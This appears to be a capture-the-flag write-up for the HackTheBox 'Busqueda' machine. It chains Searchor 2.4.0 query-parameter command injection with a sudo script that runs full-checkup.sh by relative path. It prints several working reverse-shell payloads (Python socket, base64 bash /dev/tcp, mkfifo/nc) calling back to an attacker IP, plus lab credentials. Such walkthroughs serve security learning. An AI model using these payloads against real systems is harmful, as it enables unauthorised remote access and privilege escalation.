---
title: Busqueda
date: 2026-09-18
description: Easy Linux box exploiting an unsanitized Searchor query parameter for code execution, then abusing a sudo'd system-checkup script that invokes full-checkup.sh without an absolute path.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Fri Sep 18 13:45:58 2026 as: /usr/lib/nmap/nmap -p22,80 -A -oN scan_results.txt 10.129.228.217
Nmap scan report for busqueda.htb (10.129.228.217)
Host is up (0.77s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   783.84 ms 10.10.16.1
2   382.38 ms busqueda.htb (10.129.228.217)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 18 13:46:46 2026 -- 1 IP address (1 host up) scanned in 48.17 seconds
```

Port 80 shows `searchor 2.4.0`.

---
#### Searchor
**Searchor** is a Python library for performing web searches programmatically — you query a search engine from your own code and get the results straight back.

---

# User

> CVE Reference: 
> - https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh
> - https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-

The **query** parameter is not sanitized, which led to OS command execution.

Payload:

```python
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.82',9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"))#
```

---
Alternative payload:

```sh
echo "bash  -c 'bash -i >& /dev/tcp/10.10.16.82/9001 0>&1'" | base64
```

```sh
',__import__('os').system('echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuODIvOTAwMSAwPiYxJwo= |base64 -d|bash -i')) #
```
---

Gained shell as `svc`

A subdomain showed up in `/etc/hosts` — we'd already found it with ffuf:

```txt
gitea.searcher.htb
```

Found the **.git** directory in `/var/www/app`, and its `config` file held credentials for **cody**.

**Cody** is the account behind searcher_site...
> So **cody** might be the username created by **svc** for the gitea web app

> `cody - jh1usoih2bkjaspwe92` aka `svc - jh1usoih2bkjaspwe92`

# Root

```sh
sudo -l
```

We can run it as sudo: `/opt/scripts/system-checkup.py`.

```sh
sudo python3 /opt/scripts/system-checkup.py *
```

The script offers three actions: **docker-ps**, **docker-inspect**, and **full-checkup**.

`docker-ps` acts the same as `docker ps`, so `docker-inspect` maps to `docker inspect` as well. Listing the containers shows **gitea** running inside Docker, so we inspect it:

```sh
sudo python3 /opt/scripts/system-checkup.py docker-inspect -f 'json' gitea
```

**Alternative** — if plain text isn't working, use this template instead:

```sh
sudo python3 /opt/scripts/system-checkup.py docker-inspect -f '{{json .}}' gitea
```

The config comes back as JSON and holds the **gitea database password** — presumably gitea's administrator:

> `administrator - yuiu1hoiu4i5ho1uh`

Log in to gitea as administrator.

The admin has a private repo called `scripts` containing **system-checkup.py**.

Reviewing system-checkup.py:

```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)

```

When the **full-checkup** action runs it executes the **full-checkup.sh** script — but not through an absolute path.

We can abuse that by dropping a fake script in `/tmp`.

Payload:

```sh
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.82 9001 >/tmp/f" > /tmp/full-checkup.sh
```

Change into `/tmp` and run the action as sudo — a shell lands on the listener:

```sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Gained `root`
